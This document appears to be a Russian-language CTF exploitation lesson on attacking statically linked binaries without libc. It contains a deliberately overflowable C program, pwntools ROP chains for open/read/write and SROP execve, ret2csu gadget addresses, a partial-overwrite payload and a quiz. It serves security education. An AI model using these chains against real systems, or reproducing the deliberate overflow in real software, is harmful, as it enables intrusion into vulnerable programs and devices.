---
id: pwn-static-no-libc
title: "Эксплуатация статических бинарей без libc"
category: pwn
parent: pwn-ret2libc
difficulty: expert
order: 3
tags: [static, no-libc, rop, syscall, orw, ret2dlresolve]
prerequisites: [pwn-rop, pwn-ret2libc, pwn-got-plt, pwn-ret2dlresolve]
useful_for:
  - "CTF Pwn категория"
  - "Vulnerability research"
estimated_minutes: 65
summary: "Статический бинарь не даёт libc-гаджетов: строим ROP на гаджетах самого бинаря, используем syscall/ORW, ret2dlresolve и внутренние функции как mini-libc."
---

## Вопрос, с которого всё начинается

Ты привык к ret2libc: утечка `puts` → база libc → `system`. Но вот задача, где `checksec` показывает `Statically linked`. Отдельной libc нет — весь код уже внутри бинаря. Утекать нечего: нет `libc.so.6`, нет GOT-записи, указывающей в библиотеку.

Как получить shell, когда `system` негде взять? Ответ — **системные вызовы**: их можно вызывать напрямую, если найти в бинаре инструкцию `syscall`.

## Наш пример: статический PIE-бинарь

```c
#include <unistd.h>
int main(void) {
    char buf[64];
    read(0, buf, 0x200);   // переполнение
    return 0;
}
```

```bash
$ gcc -static -fno-stack-protector -pie -fPIE -o chall chall.c
$ file ./chall
./chall: ELF 64-bit LSB pie executable, statically linked, ...
$ checksec --file=./chall
    NX:   NX enabled
    PIE:  PIE enabled
```

Статический и PIE — адреса кода рандомизированы, но зато весь код (включая syscall-обёртки) уже внутри.

## Шаг 1. Есть ли system и syscall

Первым делом проверь, что доступно:

```bash
$ nm ./chall | grep -E " system$| execve$"
$ ROPgadget --binary ./chall | grep -c "syscall"
1
```

`system` может присутствовать (если статически слинкована glibc), но её адрес при PIE рандомизирован. Зато `syscall` в статическом бинаре почти всегда есть — это наш ключ.

## Шаг 2. Что такое syscall и ORW

**Системный вызов** — способ попросить ядро что-то сделать (`read`, `write`, `open`). На x86-64 номер вызова кладётся в `rax`, аргументы — в `rdi`, `rsi`, `rdx`, а инструкция `syscall` передаёт управление ядру.

В CTF часто включён **seccomp** — фильтр, запрещающий `execve`. Тогда вместо shell строят **ORW**-цепочку: `open("flag")` → `read` → `write`. Номера вызовов:

| Syscall | Номер |
|---|---|
| read | 0 |
| write | 1 |
| open | 2 |
| execve | 59 |
| rt_sigreturn | 15 |

## Шаг 3. Собираем ORW-цепочку

Найдём гаджеты и соберём цепочку. Буфер для флага положим в `.bss`:

```python
from pwn import *
context.binary = elf = ELF('./chall')
rop = ROP(elf)
pop_rax = rop.find_gadget(['pop rax','ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi','ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx','ret'])[0]
syscall = rop.find_gadget(['syscall','ret'])[0]
buf = elf.bss(0x200)

chain  = flat(pop_rax, 2, pop_rdi, flag_addr, pop_rsi, 0, pop_rdx, 0, syscall)   # open("flag")
chain += flat(pop_rax, 0, pop_rdi, 3, pop_rsi, buf, pop_rdx, 0x100, syscall)     # read(3, buf, 0x100)
chain += flat(pop_rax, 1, pop_rdi, 1, pop_rsi, buf, pop_rdx, 0x100, syscall)     # write(1, buf, 0x100)
p.sendline(flat({offset: chain}))
```

Первая строка открывает файл `flag` (дескриптор попадёт в `rax` = 3), вторая читает его в `.bss`, третья печатает. Никакой libc не нужно.

## Шаг 4. Если гаджетов не хватает: ret2csu

Иногда нет `pop rsi`/`pop rdx`. Тогда их достают из `__libc_csu_init` — функция есть и в статических бинарях с glibc. Она загружает `r13→rsi`, `r14→rdx` и вызывает указатель:

```python
csu_pop  = 0x4011da   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x4011c0   # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
```

`ret2csu` требует двух этапов (настройка регистров + вызов) — цепочка длиннее, но возможности шире. Подробно — в `pwn-ret2csu`.

## Шаг 5. Если гаджетов совсем мало: SROP

**SROP** (sigreturn-oriented programming) использует syscall `rt_sigreturn` (15): он восстанавливает **все** регистры из поддельного фрейма на стеке. Если у тебя есть только `syscall; ret`, этого достаточно, чтобы установить разом `rax`, `rdi`, `rsi`, `rdx`, `rip`, `rsp`:

```python
frame = SigreturnFrame()
frame.rax = 59            # execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
payload = flat(b'A'*offset, pop_rax, 15, syscall, frame)
```

Схема: ставим `rax = 15`, делаем `syscall` — ядро выполняет `rt_sigreturn` и берёт регистры из фрейма. Это стандартный маршрут для статики с минимумом гаджетов.

## Шаг 6. Partial overwrite при PIE без утечки

PIE рандомизирует базу, но **младшие 12 бит адреса фиксированы** (страничное выравнивание). Если утечки нет, перезапиши только младшие 1–2 байта адреса возврата, направив поток в известную точку на той же странице (например, `main` или `syscall`-гаджет):

```python
payload = b'A'*offset + b'\x26\x11'   # только 2 младших байта цели
```

Проверяй в gdb, что перезапись попадает точно в нужную инструкцию.

## Шаг 7. musl-сборки

Статические бинари часто собраны на **musl** (Alpine, Docker). Особенности: свой аллокатор `mallocng` вместо glibc, нет `__free_hook` и glibc-специфичных символов, `system` может отсутствовать вовсе. Для ROP всё так же: ищи `syscall; ret` и гаджеты на регистры, строй ORW. Для heap-задач изучай `mallocng` отдельно (`pwn-musl`).

## Практический алгоритм

Соберём разобранное в порядок действий. Сначала определи: статический ли бинарь (`file`, `ldd`), включён ли PIE, есть ли `system`. Если `system` есть и PIE выключен — это ret2libc-подобный прямой вызов. Если PIE включён — нужна утечка базы или partial overwrite. Если `system` нет — строй ORW через `syscall`. При нехватке гаджетов на регистры — ret2csu или SROP. Всегда проверяй `seccomp-tools dump ./chall`, если есть подозрение на песочницу: она решает, доступен ли `execve` вообще. Для musl изучай `mallocng`. Практикуйся на задачах с glibc static и musl static — статические бинари частое явление в embedded, и умение работать без libc-утечки критично.

## Почему это встречается в реальности

Статические бинари — не экзотика. Прошивки роутеров и IoT-устройств почти всегда статические: чтобы не тащить за собой библиотеки, код вкомпилирован целиком. Alpine Linux (и Docker-образы на его базе) использует musl и часто статическую линковку. Поэтому навык работы без libc-утечки — не «редкий приём для CTF», а практическая необходимость при анализе embedded-устройств. Держи под рукой шаблоны ORW и SROP: они экономят время, когда очередной бинарь окажется статическим.

## На что смотреть дальше

- **PIE включён** — нужна утечка базы или partial overwrite.
- **Нет `system`** (musl) — только syscall/ORW.
- **Нет гаджетов на регистры** — ret2csu или SROP.
- **Номер syscall** — проверяй ABI: на x86-64 номер в `rax`.
- **Стек не выровнен** — добавь лишний `ret`.
- **seccomp** — проверь `seccomp-tools dump ./chall` перед выбором `execve` против ORW.

## Что мы теперь знаем

- В статическом бинаре libc вкомпилирована; ret2libc неприменим.
- Syscall-гаджет (`syscall; ret`) — ключ к прямому вызову ядра.
- ORW (`open`/`read`/`write`) работает без `system` и обходит seccomp.
- ret2csu добирает недостающие регистры из `__libc_csu_init`.
- SROP восстанавливает все регистры одним `rt_sigreturn`.
- Partial overwrite обходит PIE без утечки.

## Квиз

Проверь себя.

```quiz
- question: "Почему в статическом бинаре нет ret2libc?"
  options:
    - "libc внутри бинаря; нет отдельного libc и утечки её базы"
    - "Статика запрещает ROP"
    - "Нет стека"
    - "Нет syscalls"
  answer: 0
  explanation: "В статике libc слинкована внутрь; гаджеты берутся из бинаря."
- question: "Какой приём используют вместо вызова system в статике?"
  options:
    - "ret2syscall (execve через syscall)"
    - "FSOP"
    - "tcache poisoning"
    - "unsorted attack"
  answer: 0
  explanation: "Строят цепочку с syscall execve/ORW."
- question: "Что делать, если execve запрещён seccomp?"
  options:
    - "Использовать ORW (open/read/write)"
    - "Отключить seccomp"
    - "Снять canary"
    - "Расширить tcache"
  answer: 0
  explanation: "ORW читает флаг без execve."
- question: "Где искать строку /bin/sh в статике?"
  options:
    - "strings -a -t x ./binary | grep /bin/sh"
    - "ldd"
    - "nm"
    - "readelf -h"
  answer: 0
  explanation: "Строка часто присутствует; strings даёт её адрес."
- question: "Чем static-pie отличается от обычной статики?"
  options:
    - "Адреса рандомизированы (нужна база)"
    - "Нет syscalls"
    - "Нет гаджетов"
    - "Он динамический"
  answer: 0
  explanation: "static-pie рандомизирует базу, поэтому нужна утечка."
```

## Куда дальше

В `pwn-heap-basics` мы вернёмся к куче и разберём, как устроены chunk'и glibc — основу большинства heap-эксплойтов. А пока главное: **когда libc нет, её заменяет `syscall`; ORW читает флаг без единой библиотечной функции.**

## Где пригодится

- **CTF:** Pwn — статические бинари.
- **Bug bounty:** IoT/embedded (часто статика).
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development.
